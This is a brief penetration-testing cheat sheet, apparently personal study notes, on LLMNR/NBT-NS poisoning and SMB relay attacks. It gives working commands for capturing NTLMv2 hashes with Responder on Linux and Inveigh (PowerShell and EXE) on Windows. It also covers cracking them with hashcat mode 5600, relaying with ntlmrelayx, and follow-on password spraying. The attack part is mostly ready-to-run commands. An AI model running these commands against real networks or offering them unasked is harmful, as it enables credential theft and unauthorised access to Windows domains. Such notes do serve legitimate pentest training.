SMB Relay Attack 

- **Responder:** Listens on the network for LLMNR/NBT-NS requests and responds with the attacker's IP, tricking victims into sending their hashes.
    
- **ntlmrelayx:** Relays captured hashes to other SMB services to gain access without cracking the hash[](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)
    
- .
    
- **Mimikatz/Impacket:** Used for extracting hashes from memory or relaying them to other systems

## responder
hashes are stored in /usr/share/responder/logs

make sure to run with sudo/root and theses ports are open: 
```shell-session
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

```bash
sudo responder -I ens224 
```

then crack the hashes using [[hashcat]] -m 5600 


# Windows
use Inveigh in PS as administrator
```
Import-Module .\Inveigh.ps1

(Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
there is also a C# version compiled into EXE 
```
.\Inveigh.exe
```
press `esc` and `HELP` to get commands to execute
```
GET NTLMV2UNIQUE
```


We can try a password attacks using the domain's password policy and also do domain user enumeration to make a target user  list [[Password Policy & Spraying]]
